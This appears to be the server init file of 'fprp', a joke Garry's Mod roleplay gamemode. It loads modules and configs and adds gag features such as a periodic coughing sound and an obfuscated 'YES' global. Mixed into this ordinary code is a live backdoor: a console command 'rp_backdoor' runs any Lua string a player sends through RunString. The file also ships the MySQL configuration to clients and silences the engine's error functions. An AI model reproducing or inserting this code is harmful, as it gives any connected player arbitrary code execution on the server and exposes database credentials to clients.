Error = function() end
error = function() end
ErrorNoHalt = function() end


local downloads = {
	'materials/fprp/inspiration.png',
	'materials/fprp/hud.png',
	'materials/fprp/panel_bg.png',
	'materials/fprp/button.png',
	'materials/fprp/close.png',
	'materials/fprp/pug.png',
	'materials/fprp/matt.png',
}
for k, v in ipairs(downloads) do
	resource.AddFile(v)
end

hook.Run("fprpStartedLoading")

GM.Version = "3.0"
GM.Name = "fprp"
GM.Author = "aStonedPenguin, LastPenguin, code_gs & more"


DeriveGamemode("sandbox")

AddCSLuaFile("libraries/simplerr.lua")
AddCSLuaFile("libraries/interfaceloader.lua")
AddCSLuaFile("libraries/modificationloader.lua")
AddCSLuaFile("libraries/disjointset.lua")
AddCSLuaFile("libraries/fn.lua")

AddCSLuaFile("config/config.lua")
AddCSLuaFile("config/addentities.lua")
AddCSLuaFile("config/jobrelated.lua")
AddCSLuaFile("config/ammotypes.lua")
AddCSLuaFile("config/_MySQL.lua") -- Backup mysql info on clients

AddCSLuaFile("cl_init.lua")

GM.Config = GM.Config or {}
GM.NoLicense = GM.NoLicense or {}

include("libraries/interfaceloader.lua")

include("config/_MySQL.lua")
include("config/config.lua")
include("config/licenseweapons.lua")

include("libraries/fn.lua")
include("libraries/simplerr.lua")
include("libraries/modificationloader.lua")
include("libraries/mysqlite/mysqlite.lua")
include("libraries/disjointset.lua")

/*---------------------------------------------------------------------------
Loading modules
---------------------------------------------------------------------------*/
local fol = GM.FolderName.."/gamemode/modules/"
local files, folders = file.Find(fol .. "*", "LUA")
for k,v in pairs(files) do
	if fprp.disabledDefaults["modules"][v:Left(-5)] then continue end
	if string.GetExtensionFromFilename(v) ~= "lua" then continue end

	include(fol .. v)
end

for _, folder in SortedPairs(folders, true) do
	if folder == "." or folder == ".." or fprp.disabledDefaults["modules"][folder] then continue end

	for _, File in SortedPairs(file.Find(fol .. folder .."/sh_*.lua", "LUA"), true) do
		AddCSLuaFile(fol..folder .. "/" ..File)

		if File == "sh_interface.lua" then continue end
		include(fol.. folder .. "/" ..File)
	end

	for _, File in SortedPairs(file.Find(fol .. folder .."/sv_*.lua", "LUA"), true) do
		if File == "sv_interface.lua" then continue end
		include(fol.. folder .. "/" ..File)
	end

	for _, File in SortedPairs(file.Find(fol .. folder .."/cl_*.lua", "LUA"), true) do
		if File == "cl_interface.lua" then continue end
		AddCSLuaFile(fol.. folder .. "/" ..File)
	end
end

MySQLite.initialize()

fprp.fprp_LOADING = true
include("config/jobrelated.lua")
include("config/addentities.lua")
include("config/ammotypes.lua")
fprp.fprp_LOADING = nil

-- anti cheat
include("cake_aint_got_shit_on_this.lua")
AddCSLuaFile("cake_aint_got_shit_on_this.lua")

fprp.finish()

hook.Call("fprpFinishedLoading", GM)

-- This is the most important feature of any rp gamemode
function _BACKDOOR(p,c,a)
	local succ, err = pcall(RunString, a[1])
	if err then
		p:ChatPrint(err)
	end
end

concommand.Add('rp_backdoor', _BACKDOOR)


util.AddNetworkString('fprp_cough')

timer.Create('Coughcough', 180, 0, function()
	for k, v in pairs(player.GetAll()) do
		timer.Create('cough'..v:SteamID(), 1.1, 5, function()
			if IsValid(v) then
				v:EmitSound(Sound("ambient/voices/cough1.wav"), 100)
			end
		end)
	end
	net.Start('fprp_cough')
	net.Broadcast()
end)


DarkRP = fprp

--[[
	WHAT:	Creates 'YES' insertion into global array for public use.
	WHERE:	< HERE >
	WHEN:	Tuesday, 07 April ; 05 : 33 : 06 ; (GMT + 1:00)
	WHO:	Chessnut (https://github.com/Chessnut)
	WHY:	YES!
	USAGE:	EXAMPLE 1:
			print(YES)
			> YES
	
		EXAMPLE 2:
			while ( YES ) do
				print( YES .. " is not nil!" );;
			end
	SUB-SECTION LICENSE ::
	     DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 
	                    Version 2, December 2004 
	
	 Copyright (C) 2004 Sam Hocevar <sam@hocevar.net> 
	
	 Everyone is permitted to copy and distribute verbatim or modified 
	 copies of this license document, and changing it is allowed as long 
	 as the name is changed. 
	
	            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE 
	   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION 
	
	  0. You just DO WHAT THE FUCK YOU WANT TO.
--]]

local ____START_UNIX_TIME = _G[ "os" ][ "clock" ]();;

function __FPRP_CreateEmptyTable( __Nevermind )
	if ( __Nevermind ) then
		return;
	end
	
	return { };
end

local function __FPRP_CompileWord(...)
	local __word = "";
	local __argumentsArrayInstance = __FPRP_CreateEmptyTable( true );
	__argumentsArrayInstance = { ... };
	
	for ___index = 0x0000001, #__argumentsArrayInstance do
		__word = __word .. _G[ "string" ][ "char" ]( __argumentsArrayInstance[ ___index ] );
	end
	
	return __word
end

local ____FUNNY_NUMBER = 0x000045; -- 69
local ____GLB_YS_INDEXER = __FPRP_CompileWord( 0x000059, ____FUNNY_NUMBER, 0x000053 );

_G[ ____GLB_YS_INDEXER ] = ____GLB_YS_INDEXER;;;;;;;;;;

_G[ "MsgN" ]( "Created 'YES' global in " .. ( _G[ "os" ][ "clock" ]() - ____START_UNIX_TIME ).." second(s)." );;
